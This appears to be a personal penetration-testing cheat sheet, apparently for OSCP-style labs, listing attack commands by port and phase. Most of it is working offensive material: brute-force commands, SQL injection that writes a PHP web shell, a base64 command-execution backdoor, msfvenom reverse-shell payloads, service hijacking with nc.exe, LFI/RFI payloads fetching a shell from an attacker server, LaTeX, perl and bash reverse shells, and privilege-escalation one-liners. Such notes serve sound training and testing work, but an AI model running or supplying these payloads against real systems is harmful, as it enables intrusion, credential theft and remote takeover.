<h1>PWNAGE CHECKLIST</h1>
<h2>Basic things I forget to check.</h2>
<h3>Links at the bottom provides all of the summary I made here, **BUY RTFM**</h3>

- establish vpn connectivity / confirm connectivity
- check my ip
- Scan target network
  - basic ping sweep on large range
  - select target, make note of ip in evernote
  - document everything
- Wireshark
  - Set to specific interface
  - Check how requests being handled
  - Htmlentities / escaping / str replace
  - tcp connect success or resets
  - Responses from cli connect attempts
  - Filtering
	  - ``` ip-addr==192.168.110.2 ```
- Encoding
  - Unicode A ```%u4141```
  - Unicode NOPs ```%u9090```
  	- js ```unescape("%u4141")```

- NMAP
  - ```nmap -sC -sV -O -A -T2/3 IP-TARGET -v ``` (Overboard scan)
  - ```nmap --source-port 67 --spoof-mac Cisco --script safe -p80,443 -T3 Target_IP -vv```
  - ```nmap -sU -T3 Ip-target -v ``` (Can take forever)
  - ```--source-port 53/67``` (DNS or DHCP)
  - ```--spoof-mac Cisco```
  - ```nmap --script safe Target -vv```
  - ```nmap --script vuln Target -vv -oA nmap-vuln```
  - ```nmap -sC -sV -T3 --script vuln -p- --source-port 53 --spoof-mac cisco 10.13.37.10 -oA vuln-nmap -vv```
  - ```nmap -p- --script shodan-api --script-args 'shodan-api.apikey=STICKFISH-API-KEY' 10.10.10.10 -vv```
  - ```nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 10.10.10.10 -vv```

- Port 21
  - Banner grabbing
	  -```ftp root@ip-target```
	- Try anonymous login
	- Set to **BINARY** for exe
	- PUT / DELETE / GET
	- Check for version numbers
	- use searchsploit / google for known vulns

- Port 22
  - Banner grabbing / check username
	  - ```ssh root@192.192.192.192```

- Ports 139, 445 (SMB)
  - nmap enumerate if possible with scripts if nothing came up before. perhaps change scan speed to slower one
  - enum4linux
          - ```enum4linux 10.10.10.10 -a```
  - smbclient 
          - ```smbclient \\\\ip\\share```
          - ```smbclient -L //10.10.10.10/```
  - try to connect to them to see if they are truly alive
  - Banner grabbing even if booted
  - ```nbtscan [ip-range]``` (https://highon.coffee/blog/nbtscan-cheat-sheet/)

- Port 161 (snmp)
  - ```snmpwalk -c public -v 1 $IP 1.3.6.1.4.1.77.1.2.25```
  - ```snmp-check $IP```
  - ```onesixtyone $IP```

- Port 80 / 443 open
  - iis info
	  - 1.0	Windows NT Server 3.51
	  - 2.0	Windows NT Server 4.0
	  - 3.0	NT Server 4.0 Service Pack 3 (Internet Information Server 2.0 is automatically upgraded to Internet Information Server 3.0 during the install of SP3).
	  - 4.0	Windows NT Server 4.0 SP3 and Microsoft Internet Explorer 4.01
	  - 5.0	Windows 2000
	  - 5.1	Windows XP Professional
	  - 6.0	WIndows Server 2003
	  - 7.0	Windows Vista and WIndows Server 2008
	  - 7.5	Windows 7 and Windows Server 2008 R2
	  - 8.0	Windows 8 and Windows Server 2012
  
  - ```nikto -host ip-target -evasion 8``` (Many others, check -H)
  - ```nikto -host 10.11.1.227 -evasion 7``` (Change URL case)
  - ```nikto -host http://10.10.10.10 -port 8080 -evasion 5```
  - ```nikto -id admin:admin:Realm_name -host http://10.10.10.10 -dbcheck -evasion 5```
  
  - ```dirb http://Ip-target -r``` **Different wordlist perhaps**
        - Non-recursive to save time, then inspect further if necessary
  - ```dirb http://10.10.10.10:8080 -u admin:admin``` (Credentialed)
  
  - ```gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.13.37.10```
  
  - ```wfuzz -z file,/opt/seclists/Discovery/Web-Content/common.txt --hc 302,404 http://10.13.37.10/FUZZ```
  - ```wfuzz -c -v --hc 400,404 -z file,/usr/share/wordlists/rockyou.txt -z file,/usr/share/wordlists/rockyou.txt -d "user=FUZZ&pass=FUZZ" https://10.10.10.11:10000/session_login.cgi
  
  - ```wpscan --url http://10.10.10.10/wordpress/```
  
  - Try nmap ``` -–script=http-enum.nse``` (others available)
  	- ```nmap -T4 --script safe -p80,443 Target_IP -vv```
  - Check site in browser (http/https)
  - Resolve host name if necessary (etc/hosts)
  - Cookies
  - GET POST
  - Check source
	  - Directories
	  - Comments
	  - Script links
	  - Form methods
	  - Login forms
		  - Versions/names/brands etc
		  - Basic-ish sql injection
		    - ``` ‘or 1=1```
		    - ```union```
		      - ```  ' UNION ALL SELECT 1,2,3,4,5,6; -- ```
		      - ```' UNION SELECT 1,2,3,4,user(),6; -- ```
		      - ``` union all select 1,2,3,4,<?php echo shell_exec($_GET['cmd']);?>,6 into OUTFILE C:\\xampp\\htdocs\\naughty.php ```
		      - ``` union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users' ```
		      - ``` union select 1,2,3,4,concat(name,0x3a,password),6 FROM users ```
		      
- Port 993 / 995
  - ```openssl s_client -connect 10.10.10.10:993 -quiet```
  - ```openssl s_client -connect 10.10.10.10:993```
- Port 3389
  - ```rdesktop -z Target_IP:PORT```
  - Screen shot login screen
  - ```ncrack -vv --user admin -P password-file.txt rdp://192.168.1.1```
  - ```rdp-enum-encryption.nse rdp-vuln-ms12-020.nse```
   
<H2>Linux</H2>

- Low priv

  - Paths
        - ```export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH```
	- ```export PATH=".:$PATH"```
  - find writeable directories if /tmp or /dev/shm not available
	  - ```find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;```
  - netcat 
   	- ```>``` output to a file
   	- ```nc -nv target-ip port < filename``` (send from kali)
  - upgrade linux shell
	- ```echo os.system('/bin/bash')```
	- ```tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```
	- ```/bin/sh -i```
   	- ```python -c “import pty; pty.spawn(‘/bin/bash’)”```
		- ctrl+z backgrounds the shell on local box
		-then type:
		  - ```ssty raw -echo```
		  - ```fg```
		  - ```reset```
		  - if size is an issue type:
		  - ```stty size``` (returns current window size)
		  - ```stty -rows 48 -columns 120``` (eg size)
- Priv esc linux
  - GTFO BINS
        - ```tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/dash```
  - try ```sudo su``` or ```sudo -l```
	- If ```find``` has sudo ```sudo find /home -exec sh -i \;```
	- ```sudo zip exploit.zip exploit -T --unzip-command="python -c 'import pty; pty.spawn(\"/bin/sh\")'"``` (https://v3ded.github.io/ctf/zico2.html)
	- if these don’t work try get kernel and distro info to look for exploits
	  - ```uname -ar```
	  - ```cat /etc/issue```
	  - ```cat /etc/*-release```
	  - ```cat /etc/lsb-release```
	  - ```cat /etc/redhat-release```
	  
  - SUID
	  - ```find / -perm -u=s -type f 2>/dev/null ```
	  - ```find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null```
          - ```nmap --interactive``` then ```!sh``` (Have yet to be lucky enough to find this, much older versions only,  V. 4.53.)
  - Available programs/languages on host:
	  - ```which Perl,python```
	  - ```locate```
  - Transfer Files
	  - Nc,ncat,wget,curl,scp
	    - ```tail -f /var/log/apache2/access.log```
	    - ```scp username@remote:/file/to/send /where/to/put```
	    - ```scp user@target_ip:/tmp/stickfish/secret /root/secret-stolen```
	    - ```curl -o theFile http://IP:PORT/theFile```
	    - ```curl ftp://ftp.domain.com --user username:password```
	        - Access FTP server (Add file to end of domain to download)
	    - ```wget http://IP:PORT/theFile -O theFile```
	    - ```fetch -o theFile http://IP:PORT/theFile``` (FreeBSD)
  - Password Files
	  - /etc/pwd.db
		- /etc/spwd.db
		- /etc/shadow
		- /etc/passwd

<H2>Windows</H2>

  - Usefull commands
    - ```ver```
    - ```set```
    - ```dir /a```
    - ```netstat -ano | findstr ":3128"```
    - ```type```
    - ```ipconfig -all```
    - ```echo %HOSTNAME% && %USERNAME%```
    - ```systeminfo```
    - ```net users```
    - ```dir /s *pass* == *cred* == *vnc* == *.config*```
    - ```net start upnphost``` (or other service)
    - ```sc query state=all``` (Show services)
    - ```net user jeff password123 /add```
    - ```net localgroup "Administrators"``` (List admins)
    - ```net localgroup "Administrators" user /add``` (Add user to admin)
    - ```netsh firewall show state```
    - ```netsh firewall show config```
    - ```$psversiontable```

 - Priv esc
   - Still busy gathering info... Have this so far:
   - ```cacls C:\WINDOWS\system32\``` This displays permissions on folder & same for file eg: cacls test.txt
   
   - icacls for newer Windows versions (I think Vista upwards)
   - ```ps> runas /user:administrator cmd.exe```
   - ```accesschk.exe -ucqv *```
   
   - Hijacking
	  - ```sc config upnphost binpath= "C:\inetpub\nc.exe -nv 10.10.14.20 5555 -e C:\WINDOWS\System32\cmd.exe"```
	  - ```sc config upnphost obj= ".\LocalSystem" password= ""```
	  - ```sc qc upnphost```
	  - ```net start upnphost```
	  - Check dependancies
   
   - Some PowerShell
	  - ```powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1```

<H2>Getting In</H2>

- Put this at top because its handy as balls
  - ```<?php if(isset($_REQUEST["cli"])){ echo "<pre>"; $cli = base64_decode(urldecode(($_REQUEST["cli"]))); system($cli); echo "</pre>"; die; }?>```
  - url request must be encoded in base64 prior.
	- ```http://target?cli=%22bHMgLWxhIC92YXIvdG1wLw==%22```
  - ```msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f elf > stickfish.zip```
  - ```msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -f psh --arch x64 --platform windows -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o stick.ps1```
  - ```nc.exe 10.10.14.3 4444 -e c:\\Windows\\System32\\cmd.exe```
- Passwords
  
  - Hashcat
        - ```hashcat -m 20 -a 0 -o cracked.txt found-hash /usr/share/wordlists/rockyou.txt --force```
  
  - wfuzz
        -```wfuzz -c -v --hc 400,404 -z file,/usr/share/wordlists/rockyou.txt -z file,/usr/share/wordlists/rockyou.txt -d "user=FUZZ&pass=FUZZ" https://10.10.10.120:10000/session_login.cgi```
  
  - Hydra
          - ```hydra -l admin -P /Passwords.txt Target_Ip rdp```
	  - ```hydra -l administrator -P /opt/seclists/Passwords/Cracked-Hashes/milw0rm-dictionary.txt 10.10.10.10 http-get-form "/downloader/index.php?A=loggedin:username=^USER^&password=^PASS^:Invalid user name or password" -VV```
	  - ```hydra -l root -P /usr/share/wordlists/rockyou.txt -s 10000 10.10.10.10 https-post-form "/session_login.cgi:user=^USER^&pass=^PASS^:Login failed. Please try again." -w10 -t10 -VV -c 5 -f```
  
- Remote file inclusion (https://sushant747.gitbooks.io/total-oscp-guide/remote_file_inclusion.html)
  - Similar to local file inclusion while not hosted on the target
	- Rarer than LFI due to php.ini needs to configured for it
	- Requres unsanitised parameter:
	  - ```$theFile = $_REQUEST[“file”];```
		- ```include($theFile . “.php”);```
	- Now in browser:
	  - ```http://192.192.192.192/index.php?page=http://naughty.com/badfile.txt```
		- Badfile.txt:
		  - ```<?php echo shell_exec("whoami");?>```

- LFI (https://highon.coffee/blog/lfi-cheat-sheet/)

- Manipulate files
  - ```http://Target-site/cgi-bin/main.cgi?file=main.cgi```
  	- Show source of main.cgi

- Directory traversal and Server side tricks
  - ```http://testsite.com/get.php?f=/var/www/html/get.php```
  - ```http://testsite.com/get.cgi?f=/var/www/html/admin/get.inc```
  - ```http://testsite.com/get.asp?f=/etc/passwd```
	- Note above errors for clues on file locations etc....
  - ```foo.php?file=../../../../../../../etc/passwd```
  - ``` ../../../../../../../xampp/apache/logs/access.log%00 ``` < use with backdoor
  
  - PHP ```expect:``` #Not enabled by default, uses expect wrapper to execute commands
  	- ```http://127.0.0.1/fileincl/example1.php?page=expect://ls```
  
  - PHP (POST request) ```php://input```
	- ```http://192.168.183.128/fileincl/example1.php?page=php://input```
	  - input can be:
		- ```<? system('wget http://EVIL_CORP_SERVER/php-reverse-shell.php -O /var/www/shell.php');?>```
		- In browser:
		  - ```http://Target_IP/shell.php```
  
  - PHP ```php://filter```
	- ```http://Target_IP/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd```
	- Must decode the output from base64
	- ```/proc/self/environ``` (If you able to write there)

- Manipulate ```User Agent``` in Burp

- phpinfo()
  - https://highon.coffee/blog/lfi-cheat-sheet/#fimap--phpinfo-exploit
	- Uses phpinfo() to write temporary files together with fimap
- LATEX
  - ```\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 4444 >/tmp/f}```
  
- WAF
  - wafw00f http://example.com
  
- Transferring files & Uploads
  - Upload bypass restrictions
	  - ```?file=secret.doc%00.pdf```	  
  - I prefer SimpleHTTPServer to see active transfers
	  - ```python -m SimpleHTTPServer 443``` 

- Other
  - Reverse Shells
	  - ```\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 4444 >/tmp/f}```
	  - ```perl -e 'use Socket;$i="10.10.14.16";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```
	  - ```/bin/bash -i >& /dev/tcp/10.10.14.16/443 0>&1```

**usefull links**
- https://netsec.ws/?p=331 (msfvenom,shells,tips)
- https://medium.com/@hakluke/haklukes-ultimate-oscp-guide-part-3-practical-hacking-tips-and-tricks-c38486f5fc97
- https://sushant747.gitbooks.io/total-oscp-guide/connections.html
- http://www.fuzzysecurity.com/tutorials/16.html (Windows Priveledge Escalation tips)
- https://payatu.com/guide-linux-privilege-escalation/ (Linux Privesc)
- https://www.owasp.org/index.php/Path_Traversal  (Topics about everything)
- https://crackstation.net/
- https://github.com/Re4son/Churrasco

**Awesome books**
- RTFM (Red Team Field Manual)


